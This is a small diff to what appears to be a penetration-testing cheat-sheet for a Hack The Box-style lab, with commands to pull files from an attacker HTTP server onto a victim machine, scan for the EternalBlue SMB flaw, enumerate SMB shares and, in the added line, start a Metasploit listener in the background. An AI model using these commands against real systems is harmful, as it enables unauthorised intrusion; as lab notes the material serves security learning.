@@ -69,3 +69,5 @@ wget -r http://10.10.14.28:8000/ #run this on victim's machine for transfering f
 nmap --script vuln -p135,139,445 10.10.10.40 -oA blue_scripts #If the target is vulnerable to Eternal Blue exploit 
 
 smbclient -L //10.10.10.40 #smb recon
+
+exploit -j #for runnung a listner in background in msfconsole
